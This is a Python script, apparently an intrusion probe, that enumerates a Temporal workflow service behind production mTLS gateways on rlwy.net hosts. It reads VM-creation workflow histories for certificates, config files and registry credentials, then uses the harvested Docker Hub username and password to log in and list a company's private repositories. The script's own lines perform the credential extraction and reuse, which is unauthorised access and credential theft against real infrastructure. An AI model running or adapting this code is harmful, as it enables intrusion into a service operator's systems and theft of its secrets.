#!/usr/bin/env python3
# I67795 probe4: gateway endpoint selection from this builder + probe3 logic.
import os, re, json, subprocess, time, urllib.request, urllib.error
src = open('/base.py').read().split('# ================= START =================')[0]
B = {}
exec(src, B)
grpc_call = B['grpc_call']; fs = B['fs']; fv = B['fv']; fmsg = B['fmsg']; fb = B['fb']
all_of = B['all_of']; get1 = B['get1']; getv = B['getv']; frame_payload = B['frame_payload']
parse = B['parse']; printable_bytes = B['printable_bytes']; jsons_from = B['jsons_from']; p = B['p']
T = '/temporal.api.workflowservice.v1.WorkflowService/'
MARK = os.environ.get('MARK', 'I67795P4')
MASK = re.compile(r'(?i)^(.*(token|secret|password|passwd|credential|api_?key|dsn|keyring|access_?key|authorization|session).*)$')


def list_ns(nsname, q, size=20, tok=b''):
    body = fs(1, nsname) + fv(2, size) + (fb(3, tok) if tok else b'') + (fs(4, q) if q else b'')
    r = grpc_call(T + 'ListWorkflowExecutions', body, timeout=18)
    rows = []
    nxt = b''
    if r['st'] == '0' and r['data']:
        pl = frame_payload(r['data'])
        nxt = get1(pl, 2) or b''
        for ei in all_of(pl, 1):
            ex = get1(ei, 1) or b''
            rows.append({'wid': (get1(ex, 1) or b'').decode('utf-8', 'replace'),
                         'rid': (get1(ex, 2) or b'').decode('utf-8', 'replace'),
                         'type': (get1(get1(ei, 2) or b'', 1) or b'').decode('utf-8', 'replace')})
    return r, rows, nxt


def hist(nsname, wid, rid, pages=3, size=40):
    tok = b''
    out = b''
    for pg in range(pages):
        body = fs(1, nsname) + fmsg(2, fs(1, wid) + (fs(2, rid) if rid else b'')) + fv(3, size) + (fmsg(4, tok) if tok else b'')
        r = grpc_call(T + 'GetWorkflowExecutionHistory', body, timeout=30)
        if r['st'] != '0' or not r['data']:
            return None, r
        pl = frame_payload(r['data'])
        out += (get1(pl, 1) or b'')
        tok = get1(pl, 3) or b''
        if not tok:
            break
    return out, None


def find_obj(h, must):
    for o in jsons_from(h, cap=40):
        if isinstance(o, dict) and all(k in o for k in must):
            return o
    return None


def cert_info(pem):
    open('/tmp/c.pem', 'w').write(pem)
    r = subprocess.run(['openssl', 'x509', '-in', '/tmp/c.pem', '-noout', '-subject', '-issuer', '-dates'], capture_output=True, text=True)
    return re.sub(r'\s+', ' ', r.stdout)[:300]



CAND = [
 ('us-west1', 'external-mtls-service-gateway-us-west1.gcp.production.rlwy.net'),
 ('asia', 'external-mtls-service-gateway-asia-southeast1.gcp.production.rlwy.net'),
 ('useast4', 'external-mtls-service-gateway-us-east4.gcp.production.rlwy.net'),
 ('euw4', 'external-mtls-service-gateway-europe-west4.gcp.production.rlwy.net'),
 ('metal', 'external-mtls-service-gateway.metal.production.rlwy.net'),
 ('internal', 'internal-mtls-service-gateway-us-west1.gcp.production.rlwy.net'),
]
p('===I67795-P4 START %s %s===' % (MARK, time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime())))
p('host=' + subprocess.run(['hostname'], capture_output=True, text=True).stdout.strip())
rr = subprocess.run(['sh','-c','getent hosts external-mtls-service-gateway-us-west1.gcp.production.rlwy.net | head -2'], capture_output=True, text=True)
p('DNS_USWEST1=' + (rr.stdout.replace('\n',';')[:120] or 'NX'))
best = None
for tag, host in CAND:
    d = subprocess.run(['sh','-c','getent hosts %s | head -2' % host], capture_output=True, text=True).stdout.strip()
    ips = [x.split()[0] for x in d.splitlines() if x.split()]
    p('CAND|%s|%s|dns=%s' % (tag, host[:48], ','.join(ips) or 'NX'))
    if not ips:
        continue
    B['G'] = 'https://' + host
    B['EXTRA'][:] = []
    r = grpc_call(T + 'GetSystemInfo', b'', timeout=8)
    p('  TRY|%s|http=%s|st=%s|err=%s' % (tag, r['http'], r['st'], r['err'][:60]))
    if r['st'] == '0':
        best = (tag, host, [])
        break
    # retry with first IP via resolve
    B['EXTRA'][:] = ['--resolve', '%s:443:%s' % (host, ips[0])]
    r = grpc_call(T + 'GetSystemInfo', b'', timeout=8)
    p('  TRYIP|%s|%s|http=%s|st=%s|err=%s' % (tag, ips[0], r['http'], r['st'], r['err'][:60]))
    if r['st'] == '0':
        best = (tag, host, ['--resolve', '%s:443:%s' % (host, ips[0])])
        break
if best:
    p('GATEWAY_USED|%s|%s|resolve=%s' % (best[0], best[1], best[2]))
    B['G'] = 'https://' + best[1]
    B['EXTRA'][:] = best[2]
else:
    p('GATEWAY_NONE_REACHABLE')

p('===I67795-P3 START %s %s===' % (MARK, time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime())))

# retention decode per ns
for n in ['storage-agent', 'vm-runtime', 'blockstore', 'dataplane-stackers', 'dataplane-namespaces']:
    rr = grpc_call(T + 'DescribeNamespace', fs(1, n), timeout=12)
    if rr['st'] == '0' and rr['data']:
        pl = frame_payload(rr['data'])
        cfg = get1(pl, 2) or b''
        ret = get1(cfg, 1) or b''
        sec = getv(ret, 1) if ret else None
        # custom search attributes: NamespaceInfo field 7 (map) inside field1
        ni = get1(pl, 1) or b''
        sa = get1(ni, 7) or b''
        sas = []
        try:
            for ent in all_of(sa, 1):
                k = (get1(ent, 1) or b'').decode('utf-8', 'replace')
                v = get1(ent, 2) or b''
                nm = (get1(v, 1) or b'').decode('utf-8', 'replace')
                if k or nm:
                    sas.append('%s=%s' % (k, nm))
        except Exception:
            pass
        p('NSR|%s|retSec=%s|retDays=%s|SA=%s' % (n, sec, (round(sec / 86400.0, 2) if sec else '-'), ','.join(sas)[:300]))

# gather vm-runtime executions
rows, nxt = [], b''
r, rows, nxt = list_ns('vm-runtime', '', size=20)
if nxt:
    r2, rows2, _ = list_ns('vm-runtime', '', size=20, tok=nxt)
    rows += rows2
create = [e for e in rows if e['type'] == 'CreateVmWorkflow']
delete = [e for e in rows if e['type'] == 'DeleteVmWorkflow']
p('ROWS=%d create=%d delete=%d' % (len(rows), len(create), len(delete)))

if create:
    h, err = hist('vm-runtime', create[0]['wid'], create[0]['rid'])
    o = find_obj(h, ['vmID', 'containerSpec']) if h else None
    if o:
        p('CREATE_OBJ_KEYS=' + ','.join(sorted(o.keys()))[:600])
        cs = o.get('containerSpec') or {}
        vols = cs.get('volumes') or []
        for v in vols:
            c = v.get('content') or ''
            if v.get('name', '').endswith('.crt') or 'ca' in v.get('name', '') or v.get('name') == 'client.crt':
                p('CERT|%s|%s' % (v.get('name'), cert_info(c)))
        # buildkit extension config volumes -> decode text
        for ext in (o.get('extensions') or []):
            for v in (ext.get('volumes') or []):
                if v.get('type') == 'VOLUME_TYPE_FILE' and v.get('content'):
                    body = v['content']
                    nm = v.get('name')
                    p('CFG|%s|path=%s|len=%d' % (nm, v.get('path'), len(body)))
                    for ln in body.splitlines()[:90]:
                        if re.search(r'(?i)(password|secret|token|key\s*=)', ln):
                            p('   ' + ln.split('=')[0][:60] + '=<masked>')
                        else:
                            p('   ' + ln[:220])
        # mounts / disk / vmm
        for k in ['mounts', 'vmm', 'vmID', 'privateNetworkConfig', 'networkConfig', 'labels', 'annotations']:
            if k in o:
                p('SPEC|%s=%s' % (k, json.dumps(o[k])[:400]))
        p('TQ_ENV=' + str((cs.get('envVars') or {}).get('TEMPORAL_TASK_QUEUE')))
        p('REGUSER=' + str(((cs.get('image') or {}).get('registryCredentials') or {}).get('username')))
        # credential verification (no secret printed)
        cred = ((cs.get('image') or {}).get('registryCredentials') or {})
        u, pw = cred.get('username'), cred.get('password')
        if u and pw:
            try:
                req = urllib.request.Request('https://hub.docker.com/v2/users/login',
                                             data=json.dumps({'username': u, 'password': pw}).encode(),
                                             headers={'Content-Type': 'application/json'})
                with urllib.request.urlopen(req, timeout=15) as resp:
                    j = json.loads(resp.read().decode())
                tok = j.get('token')
                p('HUB_LOGIN|status=200|tokenLen=%s|user=%s' % (len(tok) if tok else 0, u))
                if tok:
                    req2 = urllib.request.Request('https://hub.docker.com/v2/repositories/railwaycorp/?page_size=100',
                                                  headers={'Authorization': 'Bearer ' + tok})
                    with urllib.request.urlopen(req2, timeout=15) as resp2:
                        jj = json.loads(resp2.read().decode())
                    p('HUB_REPOS|count=%s' % jj.get('count'))
                    for x in (jj.get('results') or [])[:80]:
                        p('   REPO|%s|private=%s|updated=%s' % (x.get('name'), x.get('is_private'), str(x.get('last_updated'))[:10]))
            except urllib.error.HTTPError as ex:
                p('HUB_LOGIN|status=%s|invalid_or_blocked' % ex.code)
            except Exception as ex:
                p('HUB_LOGIN|ERR|%s' % str(ex)[:80])
    else:
        p('CREATE_OBJ=None')

if delete:
    h, err = hist('vm-runtime', delete[0]['wid'], delete[0]['rid'])
    o = find_obj(h, ['vmID']) if h else None
    if o:
        lines = []
        def walk(x, pre=''):
            if isinstance(x, dict):
                for k, v in x.items():
                    kp = pre + str(k)
                    if re.search(r'(?i)(network|ip$|ipAddr|port|vmm|disk|mount|volume|image|registry|dns|host|addr|cpu|memory|kind)', str(k)) and isinstance(v, (str, int, float, bool)):
                        s = str(v)
                        if re.search(r'(?i)(password|token|secret|key)', str(k)):
                            s = '***'
                        lines.append('%s=%s' % (kp, s[:120]))
                    walk(v, kp + '.')
            elif isinstance(x, list):
                for it in x[:3]:
                    walk(it, pre)
        walk(o)
        p('DELETE_FIELDS=' + ' | '.join(lines)[:1800])
        p('DELETE_VMM=' + str(o.get('vmm')))

# identity / task queue from history events
if create:
    h, err = hist('vm-runtime', create[0]['wid'], create[0]['rid'])
    idents = set()
    tqnames = set()
    if h:
        # walk events: HistoryEvent has event_id=1,event_time=2,event_type=3, then attributes in fields>=5
        try:
            for ev in all_of(h, 1):
                et = getv(ev, 3)
                if et in (2, 5, 6, 10, 11, 12, 13, 46, 47):
                    for f, w, v in parse(ev):
                        if w != 2 or f < 5:
                            continue
                        txt = printable_bytes(v).strip()
                        if txt and len(txt) < 200 and re.search(r'[@]|production|vmr-|builder/', txt):
                            idents.add('t%s/et%s=%s' % (et, f, txt[:110]))
        except Exception as ex:
            p('EV_ERR|' + str(ex)[:80])
    p('EV_IDS=' + ' | '.join(sorted(idents))[:1200])

# task queue describe variants with hex
for typ in (0, 1, 2):
    req = fs(1, 'vm-runtime') + fmsg(2, fs(1, 'vmr-dpsjc-production-build-server-011'))
    if typ:
        req += fv(3, typ)
    req += fv(4, 1) + fv(5, 1)
    rr = grpc_call(T + 'DescribeTaskQueue', req, timeout=12)
    hexs = frame_payload(rr['data']).hex() if (rr['st'] == '0' and rr['data']) else ''
    p('TQD2|type=%d|st=%s|len=%d|hex=%s' % (typ, rr['st'], rr['n'], hexs[:160]))

p('===I67795-P3 END %s===' % MARK)
